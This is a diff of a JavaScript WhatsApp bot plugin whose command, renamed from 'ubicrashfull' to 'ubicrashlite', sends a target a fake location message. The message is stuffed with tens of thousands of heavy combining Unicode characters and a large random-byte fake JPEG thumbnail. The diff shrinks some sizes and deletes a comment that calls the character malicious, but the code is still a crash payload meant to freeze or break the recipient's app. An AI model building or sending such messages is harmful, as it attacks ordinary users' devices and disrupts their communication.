@@ -6,17 +6,14 @@ let handler = async (m, { conn }) => {
 
   const objetivo = jid;
 
-  // 🧨 Carácter Unicode malicioso
   const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵';
   const address = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);
 
-  // 🖼️ Thumbnail de 395 KB con bytes aleatorios
   const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]);
-  const fill = Buffer.alloc(395 * 1024 - header.length);
+  const fill = Buffer.alloc(380 * 1024 - header.length); // Reducido a 380 KB
   for (let i = 0; i < fill.length; i++) fill[i] = Math.floor(Math.random() * 256);
   const thumbnailPesado = Buffer.concat([header, fill]);
 
-  // 📦 Construcción del mensaje con campos extra para peso
   const fakeLoc = {
     key: {
       fromMe: false,
@@ -31,19 +28,18 @@ let handler = async (m, { conn }) => {
         address: address,
         jpegThumbnail: thumbnailPesado,
         isLive: false,
-        livePeriod: 999999999,
-        accuracyInMeters: 99999,
-        speedInMps: 500,
-        degreesClockwiseFromMagneticNorth: 359,
-        comment: '𑇂𑆿𑆿𑇂'.repeat(2000), // más bytes innecesarios
+        livePeriod: 9999999,
+        accuracyInMeters: 999,
+        speedInMps: 10,
+        degreesClockwiseFromMagneticNorth: 180,
+        comment: '𑆿𑆿'.repeat(200), // reducido
 
         contextInfo: {
-          forwardingScore: 999,
+          forwardingScore: 99,
           isForwarded: true,
-          mentionedJid: ['1234567890@s.whatsapp.net'],
           externalAdReply: {
-            title: '𑆿𑆿𑆿𑆿'.repeat(1000),
-            body: '𑇂𑇂𑇂𑇂'.repeat(1000),
+            title: '𑇂'.repeat(200),
+            body: '𑇂𑆿'.repeat(200),
             thumbnail: thumbnailPesado,
             sourceUrl: 'https://youtube.com/@p.a.zinwebkkkkj'
           }
@@ -55,7 +51,7 @@ let handler = async (m, { conn }) => {
   await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() });
 };
 
-handler.command = /^ubicrashfull$/i;
+handler.command = /^ubicrashlite$/i;
 handler.owner = true;
 
 export default handler;
